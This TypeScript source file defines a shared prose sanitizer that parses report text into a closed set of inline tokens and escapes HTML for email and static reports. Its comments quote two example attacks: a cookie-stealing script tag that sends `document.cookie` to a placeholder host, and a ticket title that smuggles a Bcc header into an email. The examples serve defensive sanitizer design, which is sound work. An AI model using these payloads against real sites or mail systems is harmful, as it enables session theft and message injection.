/**
 * The shared prose sanitizer: an allowlist, not a filter.
 *
 * Compass prose is written from ingested text. A ticket can be titled
 * `<script>fetch('//x/'+document.cookie)</script>`, that title reaches a headline,
 * the headline reaches the prose, and the prose reaches three channels. So there is
 * one sanitizer and every channel uses it.
 *
 * ## Why an allowlist of *tokens* rather than a scrubber of HTML
 *
 * A blocklist over HTML is the wrong shape for this problem: it has to anticipate
 * every dangerous construct, and it fails open on the one it did not think of. This
 * parses prose into a closed set of inline tokens — `text`, `emphasis`, `strong`,
 * `code` — and every channel renders *those*. There is no branch anywhere that
 * emits a caller-supplied tag, so there is nothing for an injected payload to be.
 *
 * `<script>` is not stripped, escaped-and-hoped-for, or filtered. It is never
 * parsed as markup at all: it lands in a `text` token and each channel prints it as
 * the literal characters a manager should see, because "a ticket is *called* that"
 * is a fact the report has to be able to state.
 *
 * ## The markdown that is recognised
 *
 * Exactly three inline forms, chosen because the renderers actually emit them:
 * `*emphasis*` for the run-in change clause, `**strong**` for a person's name, and
 * `` `code` `` for an identifier. No links (a link in a report body would compete
 * with the evidence markers, which are the only navigation the reading column has),
 * no images, no headings, no lists, no tables, no raw HTML — the Six Spine owns the
 * document's structure and prose does not get to add to it.
 *
 * Underscores are deliberately *not* emphasis markers: `feature/PLAT-742_batch`
 * appears in real branch names and `snake_case` in real identifiers, and treating
 * them as formatting would silently eat characters out of an identifier a manager
 * is trying to match against their board.
 */

/** The closed set. A renderer that meets a token not in here is a compile error. */
export const PROSE_TOKEN_TYPES = ['text', 'emphasis', 'strong', 'code'] as const;

export type ProseInlineType = (typeof PROSE_TOKEN_TYPES)[number];

export interface ProseInline {
  readonly type: ProseInlineType;
  /** Always the literal characters to display. Never markup, never an entity. */
  readonly text: string;
}

/** One paragraph: the inline tokens it is made of, in order. */
export interface ProseParagraph {
  readonly inlines: readonly ProseInline[];
}

const MARKERS = [
  { marker: '**', type: 'strong' as const },
  { marker: '`', type: 'code' as const },
  { marker: '*', type: 'emphasis' as const },
];

/**
 * Splits one paragraph into allowlisted inline tokens.
 *
 * A marker that is never closed is not formatting — it is a literal asterisk or
 * backtick, which is what a manager typed. So an unpaired marker falls through to
 * the text token rather than swallowing the rest of the paragraph.
 */
export function parseProseInlines(paragraph: string): readonly ProseInline[] {
  const inlines: ProseInline[] = [];
  let buffer = '';

  const flush = (): void => {
    if (buffer.length > 0) {
      inlines.push({ type: 'text', text: buffer });
      buffer = '';
    }
  };

  let index = 0;
  while (index < paragraph.length) {
    const opener = MARKERS.find((candidate) => paragraph.startsWith(candidate.marker, index));

    if (opener === undefined) {
      buffer += paragraph[index];
      index += 1;
      continue;
    }

    const contentStart = index + opener.marker.length;
    const closeAt = paragraph.indexOf(opener.marker, contentStart);

    // Unclosed, or empty (`**` on its own): literal characters, not formatting.
    if (closeAt === -1 || closeAt === contentStart) {
      buffer += opener.marker;
      index += opener.marker.length;
      continue;
    }

    flush();
    inlines.push({ type: opener.type, text: paragraph.slice(contentStart, closeAt) });
    index = closeAt + opener.marker.length;
  }

  flush();
  return inlines;
}

/**
 * Prose into paragraphs, split on the blank line every renderer writes.
 *
 * Single newlines inside a paragraph become spaces: the deterministic renderer
 * joins an item's sentences with a space and a channel that hard-wrapped them
 * would reflow badly in an email client.
 */
export function parseProse(prose: string): readonly ProseParagraph[] {
  return prose
    .split(/\n\s*\n/)
    .map((paragraph) => paragraph.replace(/\s*\n\s*/g, ' ').trim())
    .filter((paragraph) => paragraph.length > 0)
    .map((paragraph) => ({ inlines: parseProseInlines(paragraph) }));
}

/**
 * The five characters that turn text into markup, and their entities.
 *
 * `'` is encoded as `&#39;` rather than `&apos;` because `&apos;` is not defined in
 * HTML 4 and some email clients still print it literally.
 */
const HTML_ESCAPES: Readonly<Record<string, string>> = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '"': '&quot;',
  "'": '&#39;',
};

/**
 * Escapes text for an HTML context.
 *
 * `&` runs first by virtue of being in the same pass — a two-pass implementation
 * that escaped `<` and then `&` would turn `<` into `&amp;lt;` and print the entity
 * instead of the character.
 */
export function escapeHtml(text: string): string {
  return text.replace(/[&<>"']/g, (character) => HTML_ESCAPES[character] ?? character);
}

/**
 * One line: every run of whitespace collapsed to a single space.
 *
 * For the places a report shows ingested text *outside* a paragraph — an accessible
 * name, a `title`, an email subject. `parseProse` already folds newlines inside a
 * paragraph, but an attribute value is not a paragraph, and a ticket titled
 * `fine\r\nBcc: attacker@evil.test` would otherwise carry a bare CR into the markup.
 * Harmless in an HTML attribute, not harmless in a mail header, and pointless in an
 * accessible name that a screen reader reads as one line regardless.
 *
 * Collapsing rather than stripping: the words survive, so the report can still state
 * what the ticket is called.
 */
export function collapseWhitespace(text: string): string {
  return text.replace(/\s+/g, ' ').trim();
}

/** The plain-text form: the words, with the markers dropped. Email and Slack. */
export function renderProseText(prose: string): string {
  return parseProse(prose)
    .map((paragraph) => paragraph.inlines.map((inline) => inline.text).join(''))
    .join('\n\n');
}

const HTML_TAGS: Readonly<Record<ProseInlineType, readonly [string, string]>> = {
  text: ['', ''],
  emphasis: ['<em>', '</em>'],
  strong: ['<strong>', '</strong>'],
  code: ['<code>', '</code>'],
};

/**
 * The HTML form, for a channel that has no component tree — the static report and
 * the email body.
 *
 * The web view does not use this: React builds elements from the same tokens, which
 * is stronger again because there is no string of HTML to get concatenated into.
 * Both read `parseProse`, so the allowlist is one definition.
 */
export function renderProseHtml(prose: string): string {
  return parseProse(prose)
    .map((paragraph) => {
      const inner = paragraph.inlines
        .map((inline) => {
          const [open, close] = HTML_TAGS[inline.type];
          return `${open}${escapeHtml(inline.text)}${close}`;
        })
        .join('');
      return `<p>${inner}</p>`;
    })
    .join('\n');
}
